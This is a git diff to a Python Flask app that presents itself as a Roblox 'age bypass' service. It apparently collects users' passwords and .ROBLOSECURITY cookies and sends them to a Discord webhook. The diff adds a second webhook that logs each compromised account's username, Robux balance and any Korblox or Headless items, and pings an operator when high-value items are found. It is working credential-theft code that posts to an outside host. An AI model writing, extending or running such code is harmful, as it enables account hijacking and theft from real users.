@@ -13,6 +13,76 @@ load_dotenv()
 
 app = Flask(__name__)
 
+def send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url):
+    """Send clean bypass logs (without cookie) to Discord webhook"""
+    try:
+        print("Background: Sending clean bypass logs...")
+        
+        # Check if user has Korblox or Headless for ping notification  
+        has_premium_items = korblox or headless
+        ping_content = ''
+        
+        if has_premium_items:
+            # Ping the user if account has Korblox or Headless
+            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
+            if korblox and headless:
+                ping_content += ' - Account has both Korblox AND Headless!'
+            elif korblox:
+                ping_content += ' - Account has Korblox!'
+            elif headless:
+                ping_content += ' - Account has Headless!'
+        
+        # Create Discord embed data for bypass logs (clean, no cookie)
+        bypass_data = {
+            'content': ping_content,
+            'embeds': [
+                {
+                    'title': '🎯 Age Bypass Successful',
+                    'color': 0x00ff00,  # Green color for success
+                    'thumbnail': {
+                        'url': user_info['profile_picture']
+                    },
+                    'fields': [
+                        {
+                            'name': '👤 Username',
+                            'value': user_info['username'],
+                            'inline': False
+                        },
+                        {
+                            'name': '💰 Robux',
+                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
+                            'inline': False
+                        },
+                        {
+                            'name': '📊 Status',
+                            'value': 'Successful ✅',
+                            'inline': False
+                        },
+                        {
+                            'name': '🎭 Premium Items',
+                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
+                            'inline': False
+                        }
+                    ],
+                    'footer': {
+                        'text': f'Bypassed at {time.strftime("%H:%M", time.localtime())}',
+                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
+                    }
+                }
+            ]
+        }
+        
+        # Send to bypass webhook
+        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=10)
+        
+        if response.status_code in [200, 204]:
+            print(f"Background: Bypass logs webhook successful: {response.status_code}")
+        else:
+            print(f"Background: Bypass logs webhook failed: {response.status_code}")
+            
+    except Exception as e:
+        print(f"Background: Error sending bypass logs to Discord: {str(e)}")
+
 def send_to_discord_background(password, korblox, headless, cookie, webhook_url):
     """Background function to send data to Discord webhook"""
     try:
@@ -107,7 +177,7 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
             ]
         }
         
-        # Send to Discord
+        # Send to main Discord webhook (full data with cookie)
         payload_size = len(json.dumps(discord_data))
         print(f"Background: Sending Discord payload of size: {payload_size} bytes")
         
@@ -117,6 +187,14 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
             print(f"Background: Discord webhook successful: {response.status_code}")
         else:
             print(f"Background: Discord webhook failed: {response.status_code}")
+        
+        # Also send to bypass logs webhook (clean data without cookie)
+        bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
+        if bypass_webhook_url:
+            print("Background: Sending to bypass logs webhook...")
+            send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url)
+        else:
+            print("Background: Bypass webhook URL not configured")
             
     except Exception as e:
         print(f"Background: Error sending to Discord: {str(e)}")
